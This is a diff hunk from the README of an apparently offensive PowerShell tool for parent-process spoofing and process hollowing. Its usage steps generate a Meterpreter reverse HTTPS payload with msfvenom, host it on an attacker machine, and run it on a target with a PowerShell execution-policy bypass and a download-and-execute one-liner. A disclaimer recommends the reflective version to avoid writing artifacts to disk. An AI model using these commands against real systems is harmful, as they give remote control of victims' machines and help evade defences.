@@ -44,7 +44,7 @@ YouTube (higher resolution): https://www.youtube.com/watch?v=GB59m-KJvd0
 `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=KALI_IP LPORT=443 EXITFUNC=thread -f ps1`
 2. Search for `Your payload here` in the script and replace it with the generated payload
 3. Host the script on your kali `python3 -m http.server 8088`
-4. On your target machine `powershell -ep Bypass -c IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8088/PPIDxProcHollow_v1.1.ps1')`
+4. On your target machine `powershell -ep Bypass -c IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8088/Reflective-PPIDxProcHollow_v1.2.ps1')`
 
 ## Disclaimer
 The usage section might make it seem like a 'fileless' approach but the v1.1 script **does write temporarly artifacts to disk**. I know disk is lava🔥 so use v1.2 (reflective)
